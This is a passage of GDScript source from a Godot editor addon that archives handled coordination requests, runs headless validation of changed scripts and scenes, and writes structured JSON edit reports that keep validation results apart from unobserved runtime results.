## never shows it again. Relocated, not deleted — same "don't destroy
## evidence" convention as the rest of this project's mailbox handling.
static func mark_dragon_request_handled(path: String) -> void:
	var handled_dir := COORDINATION_OUTBOX_HANDLED_DIR
	if not DirAccess.dir_exists_absolute(handled_dir):
		DirAccess.make_dir_recursive_absolute(handled_dir)
	var dest := handled_dir.path_join(path.get_file())
	if FileAccess.file_exists(dest):
		dest = handled_dir.path_join("%s.%d%s" % [dest.get_basename().get_file(), Time.get_unix_time_from_system(), dest.get_extension()])
	DirAccess.rename_absolute(path, dest)


## Writes one engain.editor_report.v1 envelope into COORDINATION_INBOX_DIR,
## named exactly the way hermes_session_adapter.py's
## COORDINATION_REPORT_FILENAME_PATTERN expects
## (editor_report.<message_id>.attempt0.json) so the adapter's own claim
## logic picks it up with zero coordination needed beyond the shared
## directory/filename contract. edit_id is the durable link back to the
## mechanical edit receipt (see edit_receipt_store.gd) — the full receipt
## is never duplicated into this report; this only says what happened.
## Splits diff_tree_fingerprints()'s own "created: X" / "modified: Y" /
## "deleted: Z" lines into three plain res://-prefixed path arrays.
## diff_tree_fingerprints() never emits any other prefix, but this stays
## defensive (an unrecognized line is silently dropped, not guessed at)
## rather than assuming its own caller's format can never change.
static func _split_live_tree_changes(changes: PackedStringArray) -> Dictionary:
	var created: Array = []
	var modified: Array = []
	var deleted: Array = []
	for change in changes:
		var line := String(change)
		if line.begins_with("created: "):
			created.append("res://" + line.substr("created: ".length()))
		elif line.begins_with("modified: "):
			modified.append("res://" + line.substr("modified: ".length()))
		elif line.begins_with("deleted: "):
			deleted.append("res://" + line.substr("deleted: ".length()))
	return {"created": created, "modified": modified, "deleted": deleted}


## Mechanical headless validation of the changed .gd/.tscn paths from a
## SUCCESSFUL DIRECT_WRITE turn — see coordination_report_validator.gd's
## own top-of-file doc for exactly what it does and does not prove (disk-
## level parse/load/instantiate, never "did the runtime actually behave
## correctly"). Spawns a fresh headless Godot process rather than the
## editor's own running instance: `--check-only` cannot instantiate a
## scene (it parses one script and quits, never running a script's own
## _init()), so a real, separate `-s <validator>` run is required. Returns
## {"status": "not_checked", "checks": []} for an empty input, for a
## spawn/parse failure, or for anything else that would otherwise require
## inventing a result — never a fabricated "passed".
static func run_coordination_validation(current_project_root: String, changed_paths: Array) -> Dictionary:
	var checkable: Array = []
	for p in changed_paths:
		var path_str := String(p)
		if path_str.ends_with(".gd") or path_str.ends_with(".tscn"):
			checkable.append(path_str)
	if checkable.is_empty():
		return {"status": "not_checked", "checks": []}

	var tmp_dir := OS.get_temp_dir()
	var unique := "%d_%d" % [Time.get_ticks_usec(), randi()]
	var paths_file := tmp_dir.path_join("hermes_editor_validate_paths_%s.json" % unique)
	var output_file := tmp_dir.path_join("hermes_editor_validate_result_%s.json" % unique)
	var writer := FileAccess.open(paths_file, FileAccess.WRITE)
	if writer == null:
		return {"status": "not_checked", "checks": []}
	writer.store_string(JSON.stringify(checkable))
	writer.close()

	var validator_script := ProjectSettings.globalize_path(
		"res://addons/hermes_editor/coordination_report_validator.gd"
	)
	var args := PackedStringArray([
		"--headless", "--path", current_project_root, "-s", validator_script,
		"--", paths_file, output_file,
	])
	var output: Array = []
	OS.execute(OS.get_executable_path(), args, output, true)

	var result := {"status": "not_checked", "checks": []}
	if FileAccess.file_exists(output_file):
		var reader := FileAccess.open(output_file, FileAccess.READ)
		if reader != null:
			var parsed: Variant = JSON.parse_string(reader.get_as_text())
			reader.close()
			if typeof(parsed) == TYPE_DICTIONARY:
				result = parsed
	if FileAccess.file_exists(paths_file):
		DirAccess.remove_absolute(paths_file)
	if FileAccess.file_exists(output_file):
		DirAccess.remove_absolute(output_file)
	return result


## Phase 1C-1 structured fact report. body is kept ONLY as a human-
## readable summary — every fact Dragon needs is its own field; nothing
## requires re-parsing prose. See this file's own "Phase 1 sideband
## coordination lane" doc and EDITOR_REPORT_KEYS in
## hermes_session_adapter.py (which MUST be kept in exact sync with this
## shape — the adapter validates by exact key match).
static func write_editor_report(dragon_request: Dictionary, edit_result: Dictionary) -> Error:
	if not DirAccess.dir_exists_absolute(COORDINATION_INBOX_DIR):
		DirAccess.make_dir_recursive_absolute(COORDINATION_INBOX_DIR)
	var message_id := EditReceiptStore.generate_edit_id()
	var succeeded: bool = edit_result.get("success", false)
	var changes: PackedStringArray = edit_result.get("live_tree_changes", PackedStringArray())
	var split := _split_live_tree_changes(changes)
	var files_created: Array = split["created"]
	var files_modified: Array = split["modified"]
	var files_deleted: Array = split["deleted"]
	var receipt_state := String(edit_result.get("edit_receipt_state", ""))

	var errors: Array = []
	var warnings: Array = []
	var status := "applied" if succeeded else "failed"
	if not succeeded:
		errors.append({
			"code": "TURN_FAILED",
			"path": null,
			"message": String(edit_result.get("error", "unknown error")),
		})
	if succeeded and receipt_state == "ERROR":
		warnings.append(
			"Edit receipt could not be fully backed up; Revert is unavailable for this edit."
		)

	# validation_result vs runtime_result — deliberately NOT the same
	# thing. validation_result is real, mechanical, disk-level proof
	# (see run_coordination_validation()). runtime_result stays honestly
	# {"status": "not_checked"} until an actual write -> load-from-disk
	# -> restart-composed-runtime -> health-check pipeline exists; calling
	# a disk-level check a "runtime result" would be a false claim about
	# something never actually observed running.
	var validation_result := {"status": "not_checked", "checks": []}
	if succeeded:
		validation_result = run_coordination_validation(
			project_root(), files_created + files_modified
		)
		if String(validation_result.get("status", "")) == "failed":
			for check in validation_result.get("checks", []):
				if String(check.get("status", "")) != "passed":
					errors.append({
						"code": "VALIDATION_FAILED",
						"path": check.get("path", ""),
						"message": String(check.get("error", "headless validation failed")),
					})

	var execution_summary := ""
	if succeeded:
		execution_summary = "Created %d file(s), modified %d file(s), deleted %d file(s)." % [
			files_created.size(), files_modified.size(), files_deleted.size(),
		]
	else:
		execution_summary = "Edit turn failed: %s" % String(edit_result.get("error", "unknown error"))

	var body := execution_summary
	if not warnings.is_empty():
		body += " (%d warning(s))" % warnings.size()
	if not errors.is_empty() and succeeded:
		body += " (%d error(s) found during validation)" % errors.size()

	var report := {
		"schema": EDITOR_REPORT_SCHEMA_ID,
		"message_id": message_id,
		"parent_message_id": String(dragon_request.get("message_id", "")),
		"source": "editor",
		"destination": "dragon3d",
		"kind": "edit_report",
		"created_at": Time.get_unix_time_from_system(),
		"edit_id": String(edit_result.get("edit_id", "")),
		"edit_receipt_state": receipt_state,
		"status": status,
		"files_created": files_created,
		"files_modified": files_modified,
		"files_deleted": files_deleted,
		"execution_summary": execution_summary,
		"errors": errors,
		"warnings": warnings,
		"validation_result": validation_result,
		"runtime_result": {"status": "not_checked"},
		"body": body,
	}
	var dest_path := COORDINATION_INBOX_DIR.path_join(
		"editor_report.%s.attempt0.json" % message_id
	)
	var tmp_path := dest_path + ".writing"
	var writer := FileAccess.open(tmp_path, FileAccess.WRITE)
	if writer == null:
		return FileAccess.get_open_error()
	writer.store_string(JSON.stringify(report, "  "))
	writer.close()
	return DirAccess.rename_absolute(tmp_path, dest_path)
